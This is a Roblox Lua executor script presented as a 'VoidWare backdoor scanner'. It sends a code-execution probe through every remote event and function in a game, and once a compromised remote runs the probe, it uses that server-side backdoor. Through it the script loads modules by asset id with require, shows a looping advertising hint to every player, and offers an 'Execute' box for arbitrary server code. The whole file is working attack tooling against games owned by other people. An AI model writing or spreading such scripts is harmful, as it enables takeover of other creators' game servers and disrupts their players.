local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

getgenv().ignore = setmetatable({}, {__newindex = function() end})

local GUI = {}

local function dragify(Frame)
    local dragToggle = nil
    local dragSpeed = .25
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    local function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if (input.UserInputState == Enum.UserInputState.End) then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if (input == dragInput and dragToggle) then
            updateInput(input)
        end
    end)
end

GUI["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
GUI["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
GUI["ScreenGui_1"].Name = "VoidWareScanner"
GUI["ScreenGui_1"].ResetOnSpawn = false

CollectionService:AddTag(GUI["ScreenGui_1"], "main");

GUI["Frame_2"] = Instance.new("Frame", GUI["ScreenGui_1"]);
GUI["Frame_2"]["BorderSizePixel"] = 0;
GUI["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Frame_2"]["Size"] = UDim2.new(0, 456, 0, 274);
GUI["Frame_2"]["Position"] = UDim2.new(0, 210, 0, 12);
GUI["Frame_2"]["BackgroundTransparency"] = 0.2;
GUI["Frame_2"].Name = "VoidWare"


GUI["Close_3"] = Instance.new("TextButton", GUI["Frame_2"]);
GUI["Close_3"]["TextWrapped"] = true;
GUI["Close_3"]["BorderSizePixel"] = 0;
GUI["Close_3"]["TextSize"] = 48;
GUI["Close_3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
GUI["Close_3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Close_3"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Close_3"]["BackgroundTransparency"] = 0.7;
GUI["Close_3"]["Size"] = UDim2.new(0, 30, 0, 30);
GUI["Close_3"]["Text"] = "×";
GUI["Close_3"]["Name"] = "Close";
GUI["Close_3"]["Position"] = UDim2.new(0, 422, 0, 4);


GUI["UICorner_4"] = Instance.new("UICorner", GUI["Close_3"]);



GUI["UICorner_5"] = Instance.new("UICorner", GUI["Frame_2"]);



GUI["TextLabel_6"] = Instance.new("TextLabel", GUI["Frame_2"]);
GUI["TextLabel_6"]["TextWrapped"] = true;
GUI["TextLabel_6"]["BorderSizePixel"] = 0;
GUI["TextLabel_6"]["TextSize"] = 12;
GUI["TextLabel_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
GUI["TextLabel_6"]["TextScaled"] = true;
GUI["TextLabel_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
GUI["TextLabel_6"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["TextLabel_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["TextLabel_6"]["BackgroundTransparency"] = 1;
GUI["TextLabel_6"]["Size"] = UDim2.new(0, 444, 0, 144);
GUI["TextLabel_6"]["Text"] = "About VoidWare:\nVoidWare is a free to use backdoor scanner with fast backdoor scanning.\nDon't like something about VoidWare?\nContact St4rFl0w on discord to request some changes! :";
GUI["TextLabel_6"]["Position"] = UDim2.new(0, 6, 0, 124);


GUI["UIGradient_7"] = Instance.new("UIGradient", GUI["TextLabel_6"]);
GUI["UIGradient_7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["Title_8"] = Instance.new("TextLabel", GUI["Frame_2"]);
GUI["Title_8"]["TextWrapped"] = true;
GUI["Title_8"]["BorderSizePixel"] = 0;
GUI["Title_8"]["TextSize"] = 28;
GUI["Title_8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
GUI["Title_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Title_8"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Title_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Title_8"]["BackgroundTransparency"] = 0.7;
GUI["Title_8"]["Size"] = UDim2.new(0, 414, 0, 30);
GUI["Title_8"]["Text"] = "VoidWare backdoor scanner";
GUI["Title_8"]["Name"] = "Title";
GUI["Title_8"]["Position"] = UDim2.new(0, 4, 0, 4);


GUI["UICorner_9"] = Instance.new("UICorner", GUI["Title_8"]);



GUI["UIGradient_a"] = Instance.new("UIGradient", GUI["Title_8"]);
GUI["UIGradient_a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["Scan_b"] = Instance.new("TextButton", GUI["Frame_2"]);
GUI["Scan_b"]["TextWrapped"] = true;
GUI["Scan_b"]["BorderSizePixel"] = 0;
GUI["Scan_b"]["TextSize"] = 36;
GUI["Scan_b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Scan_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Scan_b"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
GUI["Scan_b"]["BackgroundTransparency"] = 0.7;
GUI["Scan_b"]["Size"] = UDim2.new(0, 448, 0, 56);
GUI["Scan_b"]["Text"] = "Scan for backdoors";
GUI["Scan_b"]["Name"] = "Scan";
GUI["Scan_b"]["Position"] = UDim2.new(0, 4, 0, 38);


GUI["UICorner_c"] = Instance.new("UICorner", GUI["Scan_b"]);



GUI["UIGradient_d"] = Instance.new("UIGradient", GUI["Scan_b"]);
GUI["UIGradient_d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["UIGradient_e"] = Instance.new("UIGradient", GUI["Frame_2"]);
GUI["UIGradient_e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};


GUI["Status_f"] = Instance.new("TextLabel", GUI["Frame_2"]);
GUI["Status_f"]["TextWrapped"] = true;
GUI["Status_f"]["BorderSizePixel"] = 0;
GUI["Status_f"]["TextScaled"] = true;
GUI["Status_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Status_f"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Status_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Status_f"]["BackgroundTransparency"] = 0.7;
GUI["Status_f"]["Size"] = UDim2.new(0, 448, 0, 22);
GUI["Status_f"]["Text"] = "Status:";
GUI["Status_f"]["Name"] = "Status";
GUI["Status_f"]["Position"] = UDim2.new(0, 4, 0, 98);


GUI["UICorner_10"] = Instance.new("UICorner", GUI["Status_f"]);



GUI["UIGradient_11"] = Instance.new("UIGradient", GUI["Status_f"]);
GUI["UIGradient_11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["UIStroke_12"] = Instance.new("UIStroke", GUI["Frame_2"]);

GUI["ScreenGui_13"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
GUI["ScreenGui_13"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
GUI["ScreenGui_13"].Name = "VoidWareExecutor"
GUI["ScreenGui_13"].ResetOnSpawn = false
GUI["ScreenGui_13"].Enabled = false

CollectionService:AddTag(GUI["ScreenGui_13"], "main");

GUI["Frame_14"] = Instance.new("Frame", GUI["ScreenGui_13"]);
GUI["Frame_14"]["BorderSizePixel"] = 0;
GUI["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 274);
GUI["Frame_14"]["Position"] = UDim2.new(0, 210, 0, 12);
GUI["Frame_14"]["BackgroundTransparency"] = 0.2;
GUI["Frame_14"].Name = "VoidWareExecutor"


GUI["Close_15"] = Instance.new("TextButton", GUI["Frame_14"]);
GUI["Close_15"]["TextWrapped"] = true;
GUI["Close_15"]["BorderSizePixel"] = 0;
GUI["Close_15"]["TextSize"] = 48;
GUI["Close_15"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
GUI["Close_15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Close_15"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Close_15"]["BackgroundTransparency"] = 0.7;
GUI["Close_15"]["Size"] = UDim2.new(0, 30, 0, 30);
GUI["Close_15"]["Text"] = "×";
GUI["Close_15"]["Name"] = "Close";
GUI["Close_15"]["Position"] = UDim2.new(0, 422, 0, 4);


GUI["UICorner_16"] = Instance.new("UICorner", GUI["Close_15"]);



GUI["Sens_17"] = Instance.new("TextButton", GUI["Frame_14"]);
GUI["Sens_17"]["TextWrapped"] = true;
GUI["Sens_17"]["BorderSizePixel"] = 0;
GUI["Sens_17"]["TextScaled"] = true;
GUI["Sens_17"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
GUI["Sens_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Sens_17"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Sens_17"]["BackgroundTransparency"] = 0.7;
GUI["Sens_17"]["Size"] = UDim2.new(0, 140, 0, 30);
GUI["Sens_17"]["Text"] = "Sensation Hub";
GUI["Sens_17"]["Name"] = "Sens";
GUI["Sens_17"]["Position"] = UDim2.new(0, 214, 0, 240);


GUI["UICorner_18"] = Instance.new("UICorner", GUI["Sens_17"]);



GUI["UIGradient_19"] = Instance.new("UIGradient", GUI["Sens_17"]);
GUI["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(195, 0, 0))};


GUI["UIStroke_20"] = Instance.new("UIStroke", GUI["Frame_14"]);



GUI["UICorner_21"] = Instance.new("UICorner", GUI["Frame_14"]);



GUI["Text_22"] = Instance.new("TextLabel", GUI["Frame_14"]);
GUI["Text_22"]["TextWrapped"] = true;
GUI["Text_22"]["BorderSizePixel"] = 0;
GUI["Text_22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
GUI["Text_22"]["TextScaled"] = true;
GUI["Text_22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Text_22"]["FontFace"] = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
GUI["Text_22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Text_22"]["BackgroundTransparency"] = 0.7;
GUI["Text_22"]["Size"] = UDim2.new(0, 92, 0, 28);
GUI["Text_22"]["Text"] = "Have fun! :]";
GUI["Text_22"]["Name"] = "Text";
GUI["Text_22"]["Position"] = UDim2.new(0, 358, 0, 240);


GUI["UICorner_23"] = Instance.new("UICorner", GUI["Text_22"]);



GUI["UIGradient_24"] = Instance.new("UIGradient", GUI["Text_22"]);
GUI["UIGradient_24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(229, 229, 229)),ColorSequenceKeypoint.new(0.845, Color3.fromRGB(143, 143, 143)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(143, 143, 143))};


GUI["Clr_25"] = Instance.new("TextButton", GUI["Frame_14"]);
GUI["Clr_25"]["TextWrapped"] = true;
GUI["Clr_25"]["BorderSizePixel"] = 0;
GUI["Clr_25"]["TextScaled"] = true;
GUI["Clr_25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Clr_25"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Clr_25"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Clr_25"]["BackgroundTransparency"] = 0.7;
GUI["Clr_25"]["Size"] = UDim2.new(0, 90, 0, 30);
GUI["Clr_25"]["Text"] = "Clear";
GUI["Clr_25"]["Name"] = "Clr";
GUI["Clr_25"]["Position"] = UDim2.new(0, 120, 0, 240);


GUI["UICorner_26"] = Instance.new("UICorner", GUI["Clr_25"]);



GUI["UIGradient_27"] = Instance.new("UIGradient", GUI["Clr_25"]);
GUI["UIGradient_27"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["Exe_28"] = Instance.new("TextButton", GUI["Frame_14"]);
GUI["Exe_28"]["TextWrapped"] = true;
GUI["Exe_28"]["BorderSizePixel"] = 0;
GUI["Exe_28"]["TextScaled"] = true;
GUI["Exe_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Exe_28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Exe_28"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Exe_28"]["BackgroundTransparency"] = 0.7;
GUI["Exe_28"]["Size"] = UDim2.new(0, 110, 0, 30);
GUI["Exe_28"]["Text"] = "Execute";
GUI["Exe_28"]["Name"] = "Exe";
GUI["Exe_28"]["Position"] = UDim2.new(0, 6, 0, 240);


GUI["UICorner_29"] = Instance.new("UICorner", GUI["Exe_28"]);



GUI["UIGradient_30"] = Instance.new("UIGradient", GUI["Exe_28"]);
GUI["UIGradient_30"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};


GUI["UIGradient_31"] = Instance.new("UIGradient", GUI["Frame_14"]);
GUI["UIGradient_31"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};


GUI["TextBox_32"] = Instance.new("TextBox", GUI["Frame_14"]);
GUI["TextBox_32"]["CursorPosition"] = -1;
GUI["TextBox_32"]["TextXAlignment"] = Enum.TextXAlignment.Left;
GUI["TextBox_32"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
GUI["TextBox_32"]["BorderSizePixel"] = 0;
GUI["TextBox_32"]["TextSize"] = 18;
GUI["TextBox_32"]["TextColor3"] = Color3.fromRGB(50, 255, 50);
GUI["TextBox_32"]["TextYAlignment"] = Enum.TextYAlignment.Top;
GUI["TextBox_32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["TextBox_32"]["FontFace"] = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
GUI["TextBox_32"]["PlaceholderText"] = "Require script here...";
GUI["TextBox_32"]["Size"] = UDim2.new(0, 444, 0, 200);
GUI["TextBox_32"]["Position"] = UDim2.new(0, 6, 0, 36);
GUI["TextBox_32"]["Text"] = "";
GUI["TextBox_32"]["TextWrapped"] = true
GUI["TextBox_32"]["BackgroundTransparency"] = 0.6;


GUI["Title_33"] = Instance.new("TextLabel", GUI["Frame_14"]);
GUI["Title_33"]["TextWrapped"] = true;
GUI["Title_33"]["BorderSizePixel"] = 0;
GUI["Title_33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
GUI["Title_33"]["TextScaled"] = true;
GUI["Title_33"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
GUI["Title_33"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
GUI["Title_33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
GUI["Title_33"]["BackgroundTransparency"] = 0.7;
GUI["Title_33"]["Size"] = UDim2.new(0, 414, 0, 30);
GUI["Title_33"]["Text"] = "VoidWare backdoor scanner";
GUI["Title_33"]["Name"] = "Title";
GUI["Title_33"]["Position"] = UDim2.new(0, 4, 0, 4);


GUI["UICorner_34"] = Instance.new("UICorner", GUI["Title_33"]);



GUI["UIGradient_35"] = Instance.new("UIGradient", GUI["Title_33"]);
GUI["UIGradient_35"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};

dragify(GUI["Frame_2"])
dragify(GUI["Frame_14"])

local backdoor = nil
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

local function createTween(object, properties, duration)
    local tweenInfo = TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, tweenInfo, properties)
    tween:Play()
    return tween
end

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

local function updateStatus(message, color)
    GUI["Status_f"].Text = "Status: " .. message
    GUI["Status_f"].TextColor3 = color or Color3.fromRGB(255, 255, 255)
end

local function findRemote()
    local remotes = {}
    updateStatus("Starting scan...", Color3.fromRGB(255, 255, 0))
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        spawn(function() 
            protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    for i,remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end

        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
            continue
        end

        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
                continue
            end

            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
                continue
            end

            if remote.Parent.Name=='DefaultChatSystemChatEvents' then
                continue
            end
        end

        local code = generateName(math.random(12,30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 0))
        for code,remote in remotes do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                GUI["ScreenGui_1"].Enabled = false
                GUI["ScreenGui_13"].Enabled = true

                runRemote(remote, "require(171016405.1884*69)")            
                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner | Made by StarFlow'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                updateStatus("Backdoor found!", Color3.fromRGB(0, 255, 0))
                return true
            end
        end
        task.wait(0.05)
    end

    updateStatus("No backdoor found", Color3.fromRGB(255, 0, 0))
    return false
end

local function buttonClickEffect(button)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.1)
    task.wait(0.1)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.1)
end

GUI["Scan_b"].MouseButton1Click:Connect(function()
    GUI["Scan_b"].Text = "Scanning..."
    GUI["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 0)
    buttonClickEffect(GUI["Scan_b"])
    
    spawn(function()
        if not findRemote() then
            GUI["Scan_b"].Text = "Scan for backdoors"
            GUI["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end)
end)

GUI["Exe_28"].MouseButton1Click:Connect(function()
    local scriptText = GUI["TextBox_32"].Text
    if backdoor and scriptText ~= "" then
        runRemote(backdoor, scriptText)
        GUI["Exe_28"].Text = "Executed!"
        buttonClickEffect(GUI["Exe_28"])
        task.wait(0.5)
        GUI["Exe_28"].Text = "Execute"
    else
        GUI["Exe_28"].Text = "No script!"
        buttonClickEffect(GUI["Exe_28"])
        task.wait(0.5)
        GUI["Exe_28"].Text = "Execute"
    end
end)

GUI["Clr_25"].MouseButton1Click:Connect(function()
    GUI["TextBox_32"].Text = ""
    GUI["Clr_25"].Text = "Cleared!"
    buttonClickEffect(GUI["Clr_25"])
    task.wait(0.5)
    GUI["Clr_25"].Text = "Clear"
end)

GUI["Sens_17"].MouseButton1Click:Connect(function()
    if backdoor then
        local playerName = Players.LocalPlayer.Name
        runRemote(backdoor, "require(100263845596551)('"..playerName.."', ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(102, 0, 153)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(153, 51, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(75, 0, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))}), \"Standard\")")
        GUI["Sens_17"].Text = "Loaded!"
        buttonClickEffect(GUI["Sens_17"])
        task.wait(0.5)
        GUI["Sens_17"].Text = "Sensation Hub"
    end
end)

GUI["Close_3"].MouseButton1Click:Connect(function()
    createTween(GUI["Frame_2"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    GUI["ScreenGui_1"]:Destroy()
end)

GUI["Close_15"].MouseButton1Click:Connect(function()
    createTween(GUI["Frame_14"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    GUI["ScreenGui_13"]:Destroy()
end)

local function setupHoverEffects(button)
    button.MouseEnter:Connect(function()
        createTween(button, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
    end)
    button.MouseLeave:Connect(function()
        createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
    end)
end

setupHoverEffects(GUI["Scan_b"])
setupHoverEffects(GUI["Exe_28"])
setupHoverEffects(GUI["Clr_25"])
setupHoverEffects(GUI["Sens_17"])

GUI["Close_3"].MouseEnter:Connect(function()
    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)
GUI["Close_3"].MouseLeave:Connect(function()
    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
end)

GUI["Close_15"].MouseEnter:Connect(function()
    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)
GUI["Close_15"].MouseLeave:Connect(function()
    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
end)

GUI["TextBox_32"].Focused:Connect(function()
    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.4}, 0.2)
end)

GUI["TextBox_32"].FocusLost:Connect(function()
    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.6}, 0.2)
end)

return GUI["ScreenGui_1"], require